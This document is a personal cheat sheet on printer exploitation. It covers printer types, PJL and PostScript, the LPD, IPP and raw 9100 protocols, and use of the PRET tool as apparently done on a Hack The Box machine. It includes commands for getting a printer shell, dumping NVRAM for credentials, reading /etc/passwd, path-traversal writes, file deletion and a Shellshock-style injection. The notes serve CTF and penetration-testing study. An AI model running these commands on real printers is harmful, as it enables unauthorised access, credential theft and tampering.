Printer Exploitation:
====================
Basics:
	Types of Printers:
		MFP:(Multi Function Printer)
			Its provides functions of multiple devices such as a fax, email, photocopier, scanner and printer.
			Its used in home/small/large scale business A typical MFP is a mixture of various devices.
			MFPs contain many features:
				SDK(Software Development Kit)
				LCD panels with optical mouse and keyboard attachments
				WiFi
				HDD
				AD
				SNMP/SMTP
				editing and security of scanned documents
				cordless phone
			Types of MFP:
				Inkjet: 
				Laser:
			Internal Architecture:
				Hardware:
					RAM, Processor, Digital Photocopier, storage memory- Flash memory or hard drive.
				Software:
					Firmware/OS
			Authentication via credentials or RFID key, fingerprint, swipe card, "LDAP" is required to access the device 
		Network Printer:
			Printer connected to a network either via ethernet/Wifi
			Network printers can be accessed either by:
				DHCP(Dynamic Host Configuration Protocol) Server
				Static Network Addressing
		Non-network Printer:
			Printer connected to network using USB or PARALLEL ports on the server
	Printer Job Control Languages:
		It manages the device as a whole.
		PJL:(Printer Job Language)(most used)
			Introduced by HP 
			can be used to make permanent changes
		PML:(Printer Management Language)
			Its a proprietary language to control HP printers. 
			It combines the features of SNMP with PJL.
	Page Description Languages:(PDL)
		It specifies the appearance of the actual document.
		PS:(PostScript)
			Introduced by Adobe
			can handle both documents and graphics
			malicious work:
				DOS attack(by infinity loop)
				print job manipulation
				gaining access to printer's file system
		PCL:
			Its a standard for printers
			not used in exploitation
	Printer Protocols:
		LPD(515):(Line Printer Daemon)
			Understanding LPD:
				In LPD, to print, the client sends a control file defining job/username and a data file containing the actual data to be printed. The input type of the data file can be set in the control file by choosing among various file formats.
			Exploitation:
				LPDPrint.py:
					Read Exploitation Section below.
				LPDTest.py:
					Read Exploitation Section below.
		IPP(631):(Internet Printing Protocol)
			Understanding IPP:
				Its for communication b/w client devices and printers. It allows clients to submit one or more print jobs to the printer, and perform tasks such as querying the status of a printer/print jobs, or canceling print jobs
				if its open to the internet, it can used by anyone to print to the printer or transfer malicious data through it
		Raw Printing(9100):(aka JetDirect/AppSocket/PDL-datastream)
			Understanding Raw Printing:
				Raw Printing is not a printing protocol by itself, Instead all data sent is directly processed by the printing device, just like a parallel connection over TCP. Therefore raw port 9100 printing is supported by almost any network printer.
				Raw printing is the process of making a connection to port 9100/tcp of a network printer. It is the default method used by CUPS(Common UNIX Printing System) and the Windows printing architecture to communicate with network printers
			Exploitation:
				PRET:
					Read Exploitation Section below.
			Used in HTB::Laser
Exploitation:(HTB::Laser)
	Printers encrypt jobs while they are on the printer using AES-128 or AES-256, so if we find any printer jobs on the printer on a ctf, then we should crack it:
	PRET:
		can be used with Raw Printing(9100),LPD(515)
		Installation:
			pip install colorama pysnmp
			sudo apt-get install imagemagick ghostscript
			git clone https://github.com/RUB-NDS/PRET.git
			cd PRET
		Usage:
			pret.py:(only for Raw Printing(9100))
				This will give us a printer shell.
				ret.py [parameters] ip {pjl|ps|pcl}
					it will allow us to interact with printer using cli
				pret.py -q -s ip ps	
					flags:
						-s => --safe => verify if language is supported
						-q => --quiet => ignore warnings
				Once we have the printer shell:
					we can do ls,cd,touch,mkdir,delete,find 
					nvram dump => shows memory(NVRAM) dump
						Sometimes, we can find creds in printer memory dump
					http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
			lpd*.py:
				PRET has 2 files used to pentest only LPD(515)
					lpdprint.py:
						lpdprint.py hostname filename
					lpdtest.py:
						lpdtest.py hostname get /etc/passwd
						lpdtest.py hostname put ../../etc/passwd
						lpdtest.py hostname rm /some/file/on/printer
						lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
						lpdtest.py hostname mail lpdtest@mailhost.local
		Note:
			Only Issue => all scripts are written in python2
MS-RPRN Printer Bug:
	Read in Active Directory Exploitation Sheet to read about MS-RPRN Printer Bug.